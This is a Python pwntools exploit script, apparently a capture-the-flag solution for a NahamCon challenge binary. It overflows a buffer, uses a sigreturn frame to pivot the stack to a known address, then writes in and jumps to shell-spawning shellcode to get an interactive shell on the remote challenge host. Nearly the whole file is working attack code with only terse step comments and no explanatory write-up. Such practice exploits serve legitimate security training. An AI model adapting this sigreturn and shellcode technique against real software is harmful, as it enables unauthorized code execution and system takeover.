#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./some-really-ordinary-program')
binary.symbols['main'] = 0x401022
binary.symbols['midread'] = 0x401006

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 31225)
else:
	p = process(binary.path)

syscall = next(binary.search(asm('syscall')))
stack = 0x402ff8

frame = SigreturnFrame()
frame.rsp = stack
frame.rip = binary.sym.main

# overflow buffer
# get control of RIP
# call the read function to get 0xf in rax for syscall
# sigret
payload  = b''
payload += (0x1f4 + 8) * b'A'
payload += p64(binary.sym.midread)
payload += p64(syscall)
payload += bytes(frame)

p.sendafter('.\n',payload)

# with read called, get 0xf in rax
p.send(constants.SYS_rt_sigreturn * b'A')

# new stack that we know address of and its NX
# just put in some shell code and call it
payload  = b''
payload += asm(shellcraft.sh())
payload += (0x1f4 + 8 - len(payload)) * b'A'
payload += p64(stack - 0x1f4 - 8)

p.sendafter('.\n',payload)

# take out the garbage
p.recvuntil(p64(stack - 0x1f4 - 8))
p.interactive()
